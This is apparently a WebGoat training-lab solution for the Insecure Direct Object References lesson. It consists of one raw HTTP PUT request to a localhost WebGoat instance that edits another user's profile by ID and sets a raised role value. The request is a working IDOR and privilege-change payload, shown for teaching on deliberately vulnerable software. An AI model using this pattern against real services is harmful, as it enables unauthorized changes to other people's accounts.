# (A5) Insecure Direct Object References

## Lesson 5 - Playing with the Patterns
Edit another profile:
```
PUT http://localhost:8080/WebGoat/IDOR/profile/2342388 HTTP/1.1
Host: vernjan:8080
Content-Type: application/json
Content-Length: 77
Cookie: JSESSIONID=DTDJnkBwts-f_6uXV8AJ0iTSvX8zolnBkQR0xLuF

{"role":1, "color":"red", "size":"small", "name":"Tom Cat", "userId":2342388}
```
